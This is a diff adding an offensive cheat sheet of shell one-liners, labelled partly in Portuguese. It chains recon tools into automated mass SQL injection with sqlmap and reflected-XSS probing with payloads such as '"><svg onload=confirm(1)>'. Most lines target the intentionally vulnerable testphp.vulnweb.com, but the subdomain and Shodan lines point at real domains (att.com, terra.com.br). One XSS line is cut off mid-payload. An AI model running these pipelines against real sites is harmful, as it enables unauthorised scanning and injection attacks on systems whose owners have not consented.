@@ -1,0 +1,25 @@
+
+SQLInjection Massive
+
+​findomain -t testphp.vulnweb.com | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1​
+subfinder -d testphp.vulnweb.com | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
+
+
+XSS com GAUPLUS
+
+echo testphp.vulnweb.com | gauplus | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
+echo testphp.vulnweb.com | waybackurls​ | gf xss | uro | httpx -silent | qsreplace '">
+
+
+Recon de SUBDOMAINS com JLDC
+​sudo curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
+utilizar o subfinder, amass ou crt.sh no lugar do JDLC
+
+
+SDLOOKUP com shodan Ports
+echo terra.com.br | httpx -silent -ip | awk '{print $2}' | tr -d '[]' | xargs -I@ sh -c 'echo @ | sdlookup -json | python -m json.tool'
+​bbrf domains | httpx -ip -silent -no-color | awk '{print $2}' | anew | tr -d '[]' | xargs -I@ sh -c 'echo @ | sdlookup -json | python -m json.tool'
+
+
+Freq XSS
+echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>'​​ | freq | egrep -v 'Not'
